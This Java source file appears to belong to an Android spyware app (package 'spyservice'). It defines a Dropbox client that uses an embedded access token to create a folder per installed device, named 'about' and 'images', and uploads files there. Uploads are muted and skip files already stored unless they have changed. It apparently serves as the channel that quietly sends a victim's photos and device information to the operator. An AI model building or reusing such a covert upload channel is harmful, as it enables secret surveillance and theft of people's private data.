/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 + Copyright (C) 2020 Eldar Timraleev (aka CRaFT4ik). All rights reserved.                        +
 + Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file      +
 + except in compliance with the License. You may obtain a copy of the License at                 +
 + http://www.apache.org/licenses/LICENSE-2.0 Unless required by applicable law or agreed to in   +
 + writing, software distributed under the License is distributed on an "AS IS" BASIS, WITHOUT    +
 + WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the       +
 + specific language governing permissions and limitations under the License.                     +
 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

package ru.er_log.spyservice.network;

import android.content.Context;
import android.util.Log;

import com.dropbox.core.DbxException;
import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.util.IOUtil;
import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.CreateFolderBatchBuilder;
import com.dropbox.core.v2.files.CreateFolderBatchLaunch;
import com.dropbox.core.v2.files.FileMetadata;
import com.dropbox.core.v2.files.ListFolderResult;
import com.dropbox.core.v2.files.Metadata;
import com.dropbox.core.v2.files.WriteMode;

import java.io.IOException;
import java.io.InputStream;
import java.util.Date;
import java.util.List;

import ru.er_log.spyservice.Settings;
import ru.er_log.spyservice.loadable.BuildConfig;
import ru.er_log.spyservice.util.CommonUtils;

public class DropBox
{
    private final String cloudFolderOther;
    private final String cloudFolderImages;

    private final Context context;
    private final DbxRequestConfig config;
    private final DbxClientV2 client;

    public DropBox(Context context) throws DbxException
    {
        this.context = context;

        String uniqueId = CommonUtils.getUniqueAppInstallationId(context);
        cloudFolderOther = "/" + uniqueId + "/about";
        cloudFolderImages = "/" + uniqueId + "/images";

        config = DbxRequestConfig.newBuilder(BuildConfig.LIBRARY_PACKAGE_NAME + "/" + BuildConfig.VERSION_NAME).withUserLocale("en_US").build();
        client = new DbxClientV2(config, Settings.ACCESS_TOKEN);

        createFolders();
    }

    private void createFolders()
    {
        try { client.files().createFolderV2(cloudFolderOther); } catch (DbxException ignored) {}
        try { client.files().createFolderV2(cloudFolderImages); } catch (DbxException ignored) {}
    }

    public CreateFolderBatchLaunch createFolderBatch(List<String> paths, boolean forceAsync)
    {
        try
        {
            CreateFolderBatchBuilder builder = client.files().createFolderBatchBuilder(paths);
            builder.withAutorename(false);
            builder.withForceAsync(forceAsync);
            return builder.start();
        } catch (DbxException e)
        {
            e.printStackTrace();
            return null;
        }
    }

    public void uploadFileIfModified(Date modified, IOUtil.ProgressListener progressListener, String dropboxPath, InputStream in)
    {
        Metadata isExits = isExists(dropboxPath);
        FileMetadata fileMetadata = null;

        try { fileMetadata = (FileMetadata) isExits; }
        catch (ClassCastException ignored) {}

        if (fileMetadata == null)
        { // File not exist.
            Log.d(Settings.LOG_TAG, "File not found on server. Starting upload process.");
            uploadFile(WriteMode.OVERWRITE, modified, progressListener, dropboxPath, in);
        } else if ((modified.getTime() / 1000L) > (fileMetadata.getClientModified().getTime() / 1000L))
        { // File exists and we are going to check if we need to update it.
            Log.d(Settings.LOG_TAG, "File update needed. Starting.");
            uploadFile(WriteMode.OVERWRITE, modified, progressListener, dropboxPath, in);
        } else
        {
            Log.d(Settings.LOG_TAG, "File found on the server and no need to update it: " + dropboxPath);
        }
    }

    public void uploadFileIfNotExist(Date modified, IOUtil.ProgressListener progressListener, String dropboxPath, InputStream in)
    {
        Metadata isExits = isExists(dropboxPath);
        if (isExits != null) return;
        uploadFile(WriteMode.OVERWRITE, modified, progressListener, dropboxPath, in);
    }

    public ListFolderResult getAllFolderContent(String dropboxPath, boolean recursive) throws DbxException
    {
        return client.files().listFolderBuilder(dropboxPath).withRecursive(recursive).withIncludeMediaInfo(true).start();
    }

    public FileMetadata uploadFile(WriteMode writeMode, Date modified, IOUtil.ProgressListener progressListener, String dropboxPath, InputStream in)
    {
        try
        {
            FileMetadata metadata = client.files().uploadBuilder(dropboxPath)
                    .withMode(writeMode)
                    .withMute(Boolean.TRUE)
                    .withClientModified(modified)
                    .uploadAndFinish(in, progressListener);

//            Log.d(Settings.LOG_TAG, "File upload results: " + metadata.toString());
            return metadata;
        } catch (DbxException ex)
        {
            Log.e(Settings.LOG_TAG, "Error uploading to Dropbox: " + ex.getMessage());
            return null;
        } catch (IOException ex)
        {
            Log.e(Settings.LOG_TAG, "Error reading from input stream: \"" + dropboxPath + "\": " + ex.getMessage());
            return null;
        }
    }

    private Metadata isExists(String path)
    {
        try
        {
            return client.files().getMetadata(path);
        } catch (DbxException ignored)
        {
            return null;
        }
    }

    public String getCloudFolderOther()
    {
        return cloudFolderOther;
    }

    public String getCloudFolderImages()
    {
        return cloudFolderImages;
    }
}
